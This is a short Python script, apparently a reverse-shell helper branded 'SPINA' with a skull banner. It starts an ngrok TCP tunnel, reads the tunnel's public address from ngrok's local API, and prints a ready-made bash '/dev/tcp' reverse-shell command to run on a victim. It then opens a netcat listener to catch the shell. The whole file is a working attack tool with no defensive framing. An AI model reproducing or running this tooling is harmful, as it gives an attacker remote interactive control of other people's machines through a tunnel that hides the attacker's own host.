import subprocess,json,sys,os
print("""\n\tSPINA\n\t  _____
\t /     \\\n\t| () () |
\t \  ^  /\n\t  |||||\n""")
def main(port:int)->None:
    subprocess.Popen(args=["ngrok","tcp",str(port)],stdout=subprocess.DEVNULL,stderr=subprocess.STDOUT)
    a=subprocess.Popen(args=["curl","-s","localhost:4040/api/tunnels"],stdout=subprocess.PIPE)
    b=json.loads(a.communicate()[0])['tunnels'][0]['public_url'].split("//")[1].split(":")
    print(f"\nConnection command: sh -i >& /dev/tcp/{b[0]}/{b[1]} 0>&1\n")
    os.system(f"nc -lvnp {port}")
if __name__ == "__main__":
    try:main(int(sys.argv[1]))
    except Exception as e:quit(e)
else:pass
